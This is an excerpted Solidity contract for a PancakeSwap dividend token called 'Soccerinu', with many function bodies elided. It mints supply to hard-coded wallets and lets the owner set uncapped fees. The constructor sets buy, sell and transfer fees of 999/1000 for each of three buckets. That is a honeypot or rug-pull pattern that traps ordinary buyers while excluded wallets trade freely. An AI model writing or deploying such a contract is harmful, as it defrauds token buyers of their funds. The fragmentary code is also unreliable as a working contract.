...
contract DividendPayingToken is ERC20, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
	...
	function distributeDividends_Soccer(uint256 _amount) public{
		require(msg.sender == Soccer);
		require(totalSupply() > 0);
	...
	function _withdrawDividendOfUser(address user) internal returns (uint256) {
		...
		if (_withdrawableDividend > 0) {
			...
			(bool success, bytes memory data) = Soccer.call(abi.encodeWithSelector(0xa9059cbb, user, _withdrawableDividend));
...
contract SoccerDividendTracker is DividendPayingToken, Ownable {
	using SafeMath for uint256;
	using SafeMathInt for int256;
	...
	constructor() DividendPayingToken("Soccer_DividendTracker", "Soccer_DividendTracker") {
		claimWait = 0;
	...
	function setSoccer(address _Soccer) external onlyOwner{
		Soccer = _Soccer;
	}

	function _transfer(address, address, uint256) internal pure override {
		require(false, "SoccerDividendTracker: No transfers allowed");
	}

	function withdrawDividend() public pure override {
		require(false, "SoccerDividendTracker: withdrawDividend disabled. Use the 'claim' function on the main Soccer contract.");
	}
...
contract Token is ERC20, Ownable {
	...
	SoccerDividendTracker public dividendTracker;
    uint256 public tradingStratTime;
	address public marketingAddress = 0x5a721044E2c379Ac5A79c6f4eBf4DC9EEA29f065;
    // address public receiveAddress = 0x5a721044E2c379Ac5A79c6f4eBf4DC9EEA29f065;
    address public burnAddress = 0x000000000000000000000000000000000000dEaD;
	
	uint256 public swapTokensAtAmount = 3* 10 ** decimals();

	uint256 public dividendFeeForCharge = 40;  
    uint256 public marketingFeeForCharge = 30;    
    uint256 public burnFeeForCharge = 10; 

    uint256 public dividendFeeForSell = 40;  
    uint256 public marketingFeeForSell = 30;    
    uint256 public burnFeeForSell = 10;

    uint256 public dividendFeeForTrans = 30;  
    uint256 public marketingFeeForTrans = 10;    
    uint256 public burnFeeForTrans = 10; 

    uint256 public tradingStartTime;
    uint256 public earlySellAmount = 0;
    uint256 public earlyTradingEndTime;
    uint256 public dividendTm;
    uint256 public daysToDevidend = 2880 minutes;

    uint256 public limitTokenAmount = 10000;
	...
	constructor() ERC20("Soccerinu", "Soccerinu") {
		dividendTracker = new SoccerDividendTracker();
		...
		dividendTracker.excludeFromDividends(address(0x9B36e86215dCA7952375BF93C6bdEdD2e21116b2));
		dividendTracker.excludeFromDividends(address(dividendTracker));
		dividendTracker.excludeFromDividends(address(this));
		dividendTracker.excludeFromDividends(address(0));
		dividendTracker.setSoccer(address(this));
        ...
        excludeFromAllLimits(address(dividendTracker), true);
		...
		_mint(0x9B36e86215dCA7952375BF93C6bdEdD2e21116b2, 2000000 * (10**decimals()));
		_mint(0x5656996CB278B4B2E4e61b724b76B997905E255F, 1000000 * (10**decimals()));
		_mint(0x2580A5BE86C0F55C036b7f7459783887079187c0, 2000000 * (10**decimals()));
		_mint(0x197687063992E17a86c02286318A747d938F707e, 300000 * (10**decimals()));
		_mint(0x8456C0aE6618d3cEBC0b74B6f69AED38c14Ae6b4, 300000 * (10**decimals()));
		_mint(0xeD2578fd47BB869165c30a7BFD49C39481C057FC, 200000 * (10**decimals()));
		_mint(0x1b11095D9044E70F711364E5D1074bbD99dA1675, 100000 * (10**decimals()));
		_mint(0xc30047f6c3f0097E3C7BaCFE40d09bef5cd49395, 300000 * (10**decimals()));
		_mint(0x78Aa005aAbc6CC38C4B5c790c8dF8f6Ae42c2EF8, 800000 * (10**decimals()));
		_mint(0xB0D7aA53B76Fb0D5FFa99CE260Bd8886D5853971, 3000000 * (10**decimals()));

		setChargeFees(999,999,999);
		setTransFees(999,999,999);
		setSellFees(999,999,999);
	...
	function updatePancakeRouter(address newAddress) public onlyOwner {
		require(newAddress != address(pancakeRouter), "Soccer: The router already has that address");
	...
	function setChargeFees(uint256 _dividendFee, uint256 _marketingFee, uint256 _burnFee)  public onlyOwner {
        dividendFeeForCharge = _dividendFee;  
        marketingFeeForCharge = _marketingFee;    
        burnFeeForCharge = _burnFee; 
	}
    function setSellFees(uint256 _dividendFee, uint256 _marketingFee, uint256 _burnFee)  public onlyOwner {
        dividendFeeForSell = _dividendFee;  
        marketingFeeForSell = _marketingFee;    
        burnFeeForSell = _burnFee; 
	}
    function setTransFees(uint256 _dividendFee, uint256 _marketingFee, uint256 _burnFee)  public onlyOwner {
        dividendFeeForTrans = _dividendFee;  
        marketingFeeForTrans = _marketingFee;    
        burnFeeForTrans = _burnFee; 
	}
	function getChargeFees() public view onlyOwner returns (uint256,uint256,uint256){
		return (dividendFeeForCharge,marketingFeeForCharge,burnFeeForCharge);
	}
	function getSellFees() public view onlyOwner returns (uint256,uint256,uint256){
		return (dividendFeeForSell,marketingFeeForSell,burnFeeForSell);
	}
	function gettransFees() public view onlyOwner returns (uint256,uint256,uint256){
		return (dividendFeeForTrans,marketingFeeForTrans,burnFeeForTrans);
	}
	function excludeFromDividends(address account) external onlyOwner {
	...
	function updateDividendTracker(address newAddress) public onlyOwner {
		require(newAddress != address(dividendTracker), "Soccer: The dividend tracker already has that address");

		SoccerDividendTracker newDividendTracker = SoccerDividendTracker(payable(newAddress));

		require(newDividendTracker.owner() == address(this), "Soccer: The new dividend tracker must be owned by the Soccer token contract");
	...
	function excludeFromFees(address account, bool excluded) public onlyOwner {
		require(_isExcludedFromFees[account] != excluded, "Soccer: Account is already the value of 'excluded'");
	...
	function excludeFromPeriodLimit(address account, bool excluded) public onlyOwner {
		require(_isExcludedFromPeriodLimit[account] != excluded, "Soccer: Account is already the value of 'excluded'");
	...
	function excludeFromMaxTxLimit(address account, bool excluded) public onlyOwner {
		require(_isExcludedFromMaxTxLimit[account] != excluded, "Soccer: Account is already the value of 'excluded'");
	...
	function updateGasForProcessing(uint256 newValue) public onlyOwner {
		require(newValue >= 200000 && newValue <= 500000, "Soccer: gasForProcessing must be between 200,000 and 500,000");
		require(newValue != gasForProcessing, "Soccer: Cannot update gasForProcessing to same value");
	...
	function setTradingIsEnabled(bool status) public onlyOwner {
        tradingStartTime = block.timestamp;
        dividendTm = block.timestamp;
        earlyTradingEndTime = tradingStartTime + 60 minutes;
		emit UpdateTradingStatus(status);
	}

	function setEarlyTradingEndTime(uint256 t) public onlyOwner {
        earlyTradingEndTime = t;
    }
	...
	function setDividendTm(uint256 _dividendTm) public onlyOwner {
        dividendTm = _dividendTm;
    }
    function getDividendTm() public view  onlyOwner returns(uint256){
        return dividendTm;
    }
    function setDividendTm() public view  onlyOwner returns(uint256){
        return dividendTm;
    }
    function getEarlySellAmount() public view  onlyOwner returns(uint256){
        return earlySellAmount;
    }
    function getTime() public view onlyOwner returns (uint256){
        return block.timestamp;
    }
    function setDaysToDevidend(uint256 m) public onlyOwner {
        daysToDevidend = m * 1 minutes;
    }
    function getDaysToDevidend() public view onlyOwner returns(uint256){
        return daysToDevidend ;
    }
    function setLimitTokenAmount(uint256 _limitTokenAmount) public onlyOwner {
        limitTokenAmount = _limitTokenAmount;
    }
	function _transfer(
		address from,
		address to,
        ...
        // require(tradingEnabled == true, "wait for opening...");
		...
		if(takeFee) {
			...
			if (from == pancakePair) {
			// buy
                // if(block.timestamp < earlyTradingEndTime) {
                //     require(earlySellAmount < limitTokenAmount * 10 ** decimals(), "tokens at this early sale have no left amount, please waiting for some minutes");
                //     require(earlySellAmount.add(amount) <= limitTokenAmount * 10 ** decimals(), "exceed left amount");
                //     earlySellAmount = earlySellAmount.add(amount);
                // }
				uint256 forDividends = amount.mul(dividendFeeForCharge).div(1000);
				super._transfer(from, address(dividendTracker), forDividends);
       			dividendTracker.distributeDividends_Soccer(forDividends);
			 	emit SwapAndSendTo(forDividends, "DIVIDENDS");
                uint256 forMarketing = amount.mul(marketingFeeForCharge).div(1000);
                super._transfer(from, address(marketingAddress), forMarketing);
                uint256 forBurning = amount.mul(burnFeeForCharge).div(1000);
                super._transfer(from, address(burnAddress), forBurning);
				fees = forDividends.add(forMarketing).add(forBurning);
				
			} else if (to == pancakePair) {
			// sell
                if (amount >= balanceOf(from)) amount = amount.sub(1 * (10 ** 15));
				uint256 forDividends = amount.mul(dividendFeeForSell).div(1000);
				super._transfer(from, address(dividendTracker), forDividends);
       			dividendTracker.distributeDividends_Soccer(forDividends);
			 	emit SwapAndSendTo(forDividends, "DIVIDENDS");
                uint256 forMarketing = amount.mul(marketingFeeForSell).div(1000);
                super._transfer(from, address(marketingAddress), forMarketing);
				uint256 forBurning = amount.mul(burnFeeForSell).div(1000);
                super._transfer(from, address(burnAddress), forBurning);
				fees = forDividends.add(forMarketing).add(forBurning);
			}else{
			// send
                if (amount >= balanceOf(from)) amount = amount.sub(1 * (10 ** 15));
                uint256 forDividends = amount.mul(dividendFeeForTrans).div(1000);
				super._transfer(from, address(dividendTracker), forDividends);
       			dividendTracker.distributeDividends_Soccer(forDividends);
			 	emit SwapAndSendTo(forDividends, "DIVIDENDS");
                uint256 forMarketing = amount.mul(marketingFeeForTrans).div(1000);
                super._transfer(from, address(marketingAddress), forMarketing);
				uint256 forBurning = amount.mul(burnFeeForTrans).div(1000);
                super._transfer(from, address(burnAddress), forBurning);
				fees = forDividends.add(forMarketing).add(forBurning);
			}
    ...
    uint256 userLp = IERC20(pancakePair).balanceOf(lastTransferUser);
		...
		// balanceOf(address(dividendTracker)) >= swapTokensAtAmount && 
		if(dividendTm.add(daysToDevidend) < block.timestamp){
